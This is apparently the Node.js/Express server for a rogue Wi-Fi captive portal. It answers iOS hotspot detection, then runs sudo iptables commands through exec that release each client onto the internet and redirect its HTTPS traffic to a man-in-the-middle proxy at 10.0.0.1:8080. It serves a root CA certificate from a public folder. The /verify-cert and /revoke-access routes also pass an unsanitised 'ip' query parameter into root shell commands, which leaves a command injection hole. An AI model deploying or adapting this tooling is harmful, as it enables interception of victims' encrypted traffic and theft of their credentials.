const express = require("express");
const fs = require("fs");
const https = require("https");
const http = require("http");
const path = require("path");
const { exec } = require("child_process");

const app = express();
const PORT = 80;
const HTTP_PORT = 80;

app.use(express.json());
app.use(express.static("./public"));

const MITM_IP = "10.0.0.1";
const MITM_PORT = 8080;
const HTTPS_PORT = 443;


// Rota per captive portal iOS
app.get("/hotspot-detect.html", (req, res) => {
        
    res.setHeader("Location", "http://10.0.0.1/");
    res.status(302).end();

});

app.get("/", (req, res) => {
    const filePath = path.join(__dirname, "index.html");
    const fileStats = fs.statSync(filePath); // Ottiene dimensione esatta

    res.setHeader("Content-Type", "text/html");
    res.setHeader("Content-Length", fileStats.size);
    res.setHeader("Connection", "close");

    res.sendFile(filePath);
});




// HTTPS
const httpsApp = express();

httpsApp.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*'); 
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
    next();
});


httpsApp.get("/verify-cert", (req, res) => {
  let clientIp = req.query.ip|| req.ip || req.connection.remoteAddress;
  clientIp = clientIp.includes("::ffff:") ? clientIp.split("::ffff:")[1] : clientIp;

  if (!clientIp) return res.status(400).send("Impossibile determinare l'IP del client");
  console.log(clientIp)

  // Comandi per sbloccare il client
  const unlockCommands = [
   `sudo iptables -t nat -I PREROUTING 1 -i at0 -s ${clientIp} -j RETURN`,
  
  // NAT
  `iptables -t nat -C POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null || iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`,

  // Forward traffico
  `iptables -C FORWARD -i at0 -o eth0 -s ${clientIp} -j ACCEPT 2>/dev/null || iptables -A FORWARD -i at0 -o eth0 -s ${clientIp} -j ACCEPT`,
  `iptables -C FORWARD -i eth0 -o at0 -d ${clientIp} -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || iptables -A FORWARD -i eth0 -o at0 -d ${clientIp} -m state --state ESTABLISHED,RELATED -j ACCEPT`,
 
  // DNAT TCP 443 su mitm 
  `iptables -t nat -I PREROUTING 1 -s ${clientIp} -p tcp  --dport 443 -j DNAT --to-destination ${MITM_IP}:${MITM_PORT}`

];

  const runCommands = (commands, callback, index = 0) => {
    if (index >= commands.length) return callback();
    exec(`sudo ${commands[index]}`, () => runCommands(commands, callback, index + 1));
  };

  runCommands(unlockCommands, () => {
    res.json({ success: true, message: "Accesso Internet sbloccato" });
  });
});






httpsApp.get("/revoke-access", (req, res) => {
  // Recupero IP client
  let clientIp = req.query.ip || req.ip || req.connection.remoteAddress;
  clientIp = clientIp.includes("::ffff:") ? clientIp.split("::ffff:")[1] : clientIp;

  if (!clientIp) return res.status(400).send("Impossibile determinare l'IP del client");

  const commands = [
  `sudo iptables -t nat -D PREROUTING -i at0 -s ${clientIp} -j RETURN`,

  `sudo iptables -t nat -D PREROUTING -s ${clientIp} -p tcp --dport 443 -j DNAT --to-destination ${MITM_IP}:${MITM_PORT}`,

  `sudo iptables -D FORWARD -i at0 -o eth0 -s ${clientIp} -j ACCEPT`,
  `sudo iptables -D FORWARD -i eth0 -o at0 -d ${clientIp} -m state --state ESTABLISHED,RELATED -j ACCEPT`,

  `sudo iptables -t nat -D POSTROUTING -o eth0 -s ${clientIp} -j MASQUERADE`
];

	
  // Esecuzione
  const runCommand = (index = 0) => {
    if (index >= commands.length) {
      return res.send(`Accesso Internet revocato per ${clientIp}`);
    }

    exec(`sudo ${commands[index]}`, (err, stdout, stderr) => {
      runCommand(index + 1);
    });
  };

  runCommand();
});



// Avvia server HTTP
http.createServer(app).listen(HTTP_PORT, () => {
    console.log(`HTTP server running on port ${HTTP_PORT}`);
});

// Avvia server HTTPS con il certificato rootCA
https.createServer({
    key: fs.readFileSync(path.join(__dirname, "public/certs/rootCA.key")),
    cert: fs.readFileSync(path.join(__dirname, "public/certs/rootCA.pem"))
}, httpsApp).listen(HTTPS_PORT, () => {
    console.log(`HTTPS server running on port ${HTTPS_PORT}`);
});

// Start server
app.listen(PORT, () => {
    console.log(`Portal running on http://0.0.0.0:${PORT}`);
});
